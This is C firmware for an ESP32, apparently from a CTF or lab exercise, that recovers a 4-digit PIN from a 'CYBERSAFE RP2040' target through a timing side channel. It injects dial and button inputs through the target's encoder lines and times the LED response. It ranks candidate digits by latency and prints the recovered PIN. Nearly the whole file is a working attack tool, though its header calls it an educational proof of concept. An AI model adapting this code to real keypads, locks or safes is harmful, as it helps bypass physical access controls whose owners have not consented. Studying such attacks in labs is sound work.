/*
 * esp32-bruteforce-timebased
 *
 * Educational timing-side-channel demonstration for the CYBERSAFE RP2040.
 *
 * Target-side comparison:
 *
 *     for (int i = 0; i < 4; i++) {
 *         if (entered_pin[i] != correct_pin[i]) goto wrong_pin;
 *     }
 *     unlock();
 *
 * The target waits about 50 ms after every matching digit. A candidate with a
 * longer correct prefix therefore reaches the mismatch later and produces a
 * response delayed by another approximately 50 ms.
 * The ESP32 enters a candidate through the physical encoder interface and
 * timestamps the first WS2812 response frame. It recovers one digit at a
 * time instead of sweeping all 10,000 PINs.
 *
 * This is a lab/CTF proof of concept. A bare, optimized equality loop may
 * have too little timing difference to measure reliably; the target must have
 * a sufficiently stable timing oracle.
 */

#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/task.h"
#include "driver/gpio.h"
#include "driver/rmt_rx.h"
#include "esp_attr.h"
#include "esp_err.h"
#include "esp_log.h"
#include "esp_rom_sys.h"
#include "esp_timer.h"

static const char *TAG = "timebrute";

/* Same wiring as the physical-input brute-force fixture. */
#define PIN_ENC_A       16
#define PIN_ENC_B       17
#define PIN_BTN         21
#define PIN_WS2812      10
#define PIN_RUN         11
#define PIN_TRIG         4

#define PIN_LEN          4
#define RADIX           10

/* Encoder calibration. */
#define DIGIT_RESETS_EACH       1
#define STEP_DIR               +1
#define EDGES_PER_DIGIT         4
#define MICROSTEP_US        20000
#define INTER_DIGIT_US       3000
#define SETTLE_US            5000
#define BTN_PRESS_US        40000
#define BTN_RELEASE_US       60000
#define POST_CONFIRM_US     50000

/* Reset and response timing. */
#define RUN_LOW_US            5000
#define BOOT_WAIT_MS           800
#define RESULT_WINDOW_MS      1500       /* includes fixed error-path delays */
#define WS_ONE_THRESH_TICKS     6       /* 0.6 us at 10 MHz RMT clock */

/* The timing gap is large, so one sample is normally enough. */
#define SAMPLES_PER_CANDIDATE  1
#define RETRIES_ON_NO_FRAME    3
#define MATCH_DELAY_US      50000       /* target-side busy_wait per match */

static const uint8_t PHASE_A[4] = {1, 0, 0, 1};
static const uint8_t PHASE_B[4] = {1, 1, 0, 0};

static int g_phase = 0;
static int g_value = 0;

static rmt_channel_handle_t s_ws_chan;
static QueueHandle_t s_ws_queue;
static rmt_symbol_word_t s_ws_syms[48];

static void gpio_od(int pin)
{
    gpio_set_level(pin, 0);
    gpio_config_t cfg = {
        .pin_bit_mask = 1ULL << pin,
        .mode = GPIO_MODE_INPUT,
        .pull_up_en = GPIO_PULLUP_DISABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE,
    };
    ESP_ERROR_CHECK(gpio_config(&cfg));
}

static void gpio_pp(int pin)
{
    gpio_config_t cfg = {
        .pin_bit_mask = 1ULL << pin,
        .mode = GPIO_MODE_OUTPUT,
        .intr_type = GPIO_INTR_DISABLE,
    };
    ESP_ERROR_CHECK(gpio_config(&cfg));
    gpio_set_level(pin, 0);
}

static void gpio_init_all(void)
{
    gpio_od(PIN_ENC_A);
    gpio_od(PIN_ENC_B);
    gpio_od(PIN_BTN);
    gpio_od(PIN_RUN);
    gpio_pp(PIN_TRIG);
}

/* High means release/Hi-Z; low means drive the shared line low. */
static void set_line(int pin, int high)
{
    if (high) {
        gpio_set_direction(pin, GPIO_MODE_INPUT);
    } else {
        gpio_set_level(pin, 0);
        gpio_set_direction(pin, GPIO_MODE_OUTPUT);
    }
}

static void enc_write(int phase)
{
    set_line(PIN_ENC_A, PHASE_A[phase]);
    set_line(PIN_ENC_B, PHASE_B[phase]);
}

static void emit_edges(int count, int direction)
{
    for (int i = 0; i < count; ++i) {
        g_phase = (g_phase + direction + 4) & 3;
        enc_write(g_phase);
        esp_rom_delay_us(MICROSTEP_US);
    }
}

static void dial_to(int target)
{
    int distance = ((target - g_value) % RADIX + RADIX) % RADIX;
    for (int i = 0; i < distance; ++i) {
        emit_edges(EDGES_PER_DIGIT, STEP_DIR);
        esp_rom_delay_us(INTER_DIGIT_US);
    }
    g_value = target;
}

/* Press and return the exact timestamp immediately after release. */
static int64_t press_confirm_release_time(void)
{
    set_line(PIN_BTN, 0);
    esp_rom_delay_us(BTN_PRESS_US);
    set_line(PIN_BTN, 1);
    return esp_timer_get_time();
}

static void reset_target(void)
{
    set_line(PIN_RUN, 0);
    esp_rom_delay_us(RUN_LOW_US);
    set_line(PIN_RUN, 1);
    vTaskDelay(pdMS_TO_TICKS(BOOT_WAIT_MS));

    g_phase = 0;
    g_value = 0;
    enc_write(0);
}

/* Return immediately after the final button release for timing accuracy. */
static int64_t enter_pin_until_final_release(const uint8_t pin[PIN_LEN])
{
    for (int i = 0; i < PIN_LEN; ++i) {
        if (DIGIT_RESETS_EACH) {
            g_value = 0;
        }
        dial_to(pin[i]);
        esp_rom_delay_us(SETTLE_US);
        int64_t released_us = press_confirm_release_time();
        if (i + 1 < PIN_LEN) {
            esp_rom_delay_us(BTN_RELEASE_US);
            esp_rom_delay_us(POST_CONFIRM_US);
        } else {
            return released_us;
        }
    }
    return 0;
}

static bool IRAM_ATTR ws_rx_done(rmt_channel_handle_t channel,
                                 const rmt_rx_done_event_data_t *event,
                                 void *context)
{
    (void)channel;
    BaseType_t high_priority_task_woken = pdFALSE;
    xQueueSendFromISR((QueueHandle_t)context, event, &high_priority_task_woken);
    return high_priority_task_woken == pdTRUE;
}

static void ws2812_init(void)
{
    rmt_rx_channel_config_t cfg = {
        .gpio_num = PIN_WS2812,
        .clk_src = RMT_CLK_SRC_DEFAULT,
        .resolution_hz = 10 * 1000 * 1000,
        .mem_block_symbols = 48,
    };
    ESP_ERROR_CHECK(rmt_new_rx_channel(&cfg, &s_ws_chan));
    s_ws_queue = xQueueCreate(4, sizeof(rmt_rx_done_event_data_t));
    ESP_ERROR_CHECK(s_ws_queue ? ESP_OK : ESP_ERR_NO_MEM);

    rmt_rx_event_callbacks_t callbacks = {.on_recv_done = ws_rx_done};
    ESP_ERROR_CHECK(rmt_rx_register_event_callbacks(s_ws_chan, &callbacks,
                                                    s_ws_queue));
    ESP_ERROR_CHECK(rmt_enable(s_ws_chan));
}

static void ws_flush_queue(void)
{
    rmt_rx_done_event_data_t event;
    while (xQueueReceive(s_ws_queue, &event, 0) == pdTRUE) {
    }
}

static void ws_decode(const rmt_symbol_word_t *symbols, size_t count,
                      uint8_t rgb[3])
{
    rgb[0] = rgb[1] = rgb[2] = 0;
    int bits = count >= 24 ? 24 : (int)count;
    for (int i = 0; i < bits; ++i) {
        uint32_t high = symbols[i].level0 ? symbols[i].duration0
                                          : symbols[i].duration1;
        int bit = high >= WS_ONE_THRESH_TICKS;
        rgb[i / 8] = (uint8_t)((rgb[i / 8] << 1) | bit);
    }
}

/*
 * Return color and elapsed time from final confirmation to the first active
 * WS2812 frame. While the target is comparing, the ring is off (RGB=0,0,0),
 * so neutral frames are ignored. The first red/green frame is the reaction.
 */
static int read_status_timed(int64_t start_us, uint32_t *elapsed_us)
{
    const rmt_receive_config_t receive_cfg = {
        .signal_range_min_ns = 150,
        .signal_range_max_ns = 100000,
    };
    int64_t deadline = start_us + (int64_t)RESULT_WINDOW_MS * 1000;
    bool armed = false;

    ws_flush_queue();
    while (esp_timer_get_time() < deadline) {
        if (!armed) {
            if (rmt_receive(s_ws_chan, s_ws_syms, sizeof(s_ws_syms),
                            &receive_cfg) != ESP_OK) {
                vTaskDelay(pdMS_TO_TICKS(1));
                continue;
            }
            armed = true;
        }

        rmt_rx_done_event_data_t event;
        if (xQueueReceive(s_ws_queue, &event, pdMS_TO_TICKS(10)) != pdTRUE) {
            continue;
        }
        armed = false;
        if (event.num_symbols < 24) {
            continue;
        }

        uint8_t rgb[3];
        ws_decode(event.received_symbols, event.num_symbols, rgb);
        int64_t observed = esp_timer_get_time();
        *elapsed_us = observed > start_us ? (uint32_t)(observed - start_us) : 0;

        /* WS2812 wire order is G,R,B. */
        if (rgb[0] > rgb[1]) {
            return 1;
        }
        if (rgb[1] > rgb[0]) {
            return 0;
        }
    }
    return -1;
}

/* Color is retained for diagnostics, but timing is used for ranking. */
static bool timing_sample(const uint8_t pin[PIN_LEN], uint32_t *elapsed_us,
                          int *color)
{
    reset_target();
    gpio_set_level(PIN_TRIG, 1);
    int64_t start_us = enter_pin_until_final_release(pin);
    int result = read_status_timed(start_us, elapsed_us);
    gpio_set_level(PIN_TRIG, 0);

    *color = result;
    return result >= 0;
}

static void sort_u32(uint32_t values[], size_t count)
{
    for (size_t i = 1; i < count; ++i) {
        uint32_t value = values[i];
        size_t j = i;
        while (j > 0 && values[j - 1] > value) {
            values[j] = values[j - 1];
            --j;
        }
        values[j] = value;
    }
}

static uint32_t median_sample(const uint8_t pin[PIN_LEN], int *green_count,
                              int *valid_count)
{
    uint32_t samples[SAMPLES_PER_CANDIDATE];
    size_t count = 0;
    *green_count = 0;
    *valid_count = 0;

    for (int i = 0; i < SAMPLES_PER_CANDIDATE; ++i) {
        uint32_t elapsed = 0;
        int color = -1;
        bool valid = false;
        for (int retry = 0; retry <= RETRIES_ON_NO_FRAME; ++retry) {
            if (timing_sample(pin, &elapsed, &color)) {
                valid = true;
                break;
            }
        }
        if (!valid) {
            continue;
        }
        samples[count++] = elapsed;
        ++*valid_count;
        if (color == 1) {
            ++*green_count;
        }
    }

    if (count == 0) {
        return UINT32_MAX;
    }
    sort_u32(samples, count);
    return samples[count / 2];
}

static void print_pin(const char *label, const uint8_t pin[PIN_LEN])
{
    ESP_LOGI(TAG, "%s%d%d%d%d", label, pin[0], pin[1], pin[2], pin[3]);
}

static void recover_pin_by_timing(uint8_t recovered[PIN_LEN])
{
    memset(recovered, 0, PIN_LEN);

    for (int position = 0; position < PIN_LEN; ++position) {
        uint32_t best_score = 0;
        int best_digit = 0;

        ESP_LOGW(TAG, "timing attack: recovering digit %d/%d",
                 position + 1, PIN_LEN);

        for (int digit = 0; digit < RADIX; ++digit) {
            uint8_t candidate[PIN_LEN];
            memcpy(candidate, recovered, PIN_LEN);
            candidate[position] = (uint8_t)digit;
            for (int suffix = position + 1; suffix < PIN_LEN; ++suffix) {
                candidate[suffix] = 0;
            }

            int green_count = 0;
            int valid_count = 0;
            uint32_t score = median_sample(candidate, &green_count,
                                           &valid_count);
            ESP_LOGI(TAG,
                     "  prefix candidate %d -> median=%u us (%d/%d valid, %d green)",
                     digit, (unsigned)score, valid_count,
                     SAMPLES_PER_CANDIDATE, green_count);

            if (score != UINT32_MAX && score >= best_score) {
                best_score = score;
                best_digit = digit;
            }
        }

        recovered[position] = (uint8_t)best_digit;
        ESP_LOGW(TAG, "digit %d selected: %d (median=%u us)",
                 position, best_digit, (unsigned)best_score);
    }
}

void app_main(void)
{
    gpio_init_all();
    vTaskDelay(pdMS_TO_TICKS(300));
    ws2812_init();

    ESP_LOGW(TAG, "timing-side-channel PIN recovery started");
    ESP_LOGI(TAG,
             "ranking candidates by response latency; match step=%d us, samples/candidate=%d",
             MATCH_DELAY_US, SAMPLES_PER_CANDIDATE);

    uint8_t recovered[PIN_LEN];
    recover_pin_by_timing(recovered);
    print_pin("TIME-BASED PIN: ", recovered);

    ESP_LOGW(TAG, "recovery complete; holding target state");
    while (true) {
        vTaskDelay(pdMS_TO_TICKS(1000));
    }
}
